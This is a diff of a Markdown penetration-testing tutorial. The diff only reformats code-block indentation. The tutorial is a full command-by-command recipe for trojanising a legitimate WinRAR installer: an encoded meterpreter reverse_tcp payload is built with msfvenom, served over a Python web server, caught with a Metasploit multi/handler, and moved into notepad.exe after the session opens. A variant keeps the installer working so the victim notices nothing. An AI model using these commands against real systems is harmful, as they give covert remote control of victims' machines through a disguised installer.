@@ -235,18 +235,18 @@ We will use the `-x` option (the `-k` and `-x` options would also work).
 
 We are going to generate an x86 meterpreter payload and inject it into the WinRAR setup file. First, we download WinRAR.
 
-    ```bash
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
-    ```
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
+```
 
 ### Checking if the Payload was Generated
 
 We navigate to the directory where the payload was generated:
 
-    ```bash
-    cd ~/Desktop/Windows_Payloads/
-    ls
-    ```
+```bash
+cd ~/Desktop/Windows_Payloads/
+ls
+```
 
 We should see the `winrar.exe` payload file.
 
@@ -254,32 +254,32 @@ We should see the `winrar.exe` payload file.
 
 To serve the payload, we set up a simple web server:
 
-    ```bash
-    sudo python -m SimpleHTTPServer 80
-    ```
+```bash
+sudo python -m SimpleHTTPServer 80
+```
 
 ### Setting up a Listener (Multi-Handler)
 
 In a new tab, we start `msfconsole`:
 
-    ```bash
-    msfconsole
-    ```
+```bash
+msfconsole
+```
 
 We then configure the multi-handler:
 
-    ```bash
-    use multi/handler
-    ```
+```bash
+use multi/handler
+```
 
 Next, we set the payload that we used to generate the executable:
 
-    ```bash
-    set payload windows/meterpreter/reverse_tcp
-    set LHOST [own IP]
-    set LPORT 1234
-    run
-    ```
+```bash
+set payload windows/meterpreter/reverse_tcp
+set LHOST [own IP]
+set LPORT 1234
+run
+```
 
 ### Executing the Payload
 
@@ -293,9 +293,9 @@ On the Kali system, we receive a meterpreter session.
 
 We migrate the process that the meterpreter payload is currently running on to another process (for example, `notepad.exe`):
 
-    ```bash
-    run post/windows/migrate
-    ```
+```bash
+run post/windows/migrate
+```
 
 ![grafik](https://github.com/user-attachments/assets/dbd5d1aa-d2ca-4d62-b740-9baa19f01462)
 
@@ -303,6 +303,6 @@ We migrate the process that the meterpreter payload is currently running on to a
 
 The `-k` option maintains the functionality of the file we are injecting with a payload. However, it doesn't work on a lot of executables and requires extensive testing with different programs.
 
-    ```bash
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
-    ```
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
+```
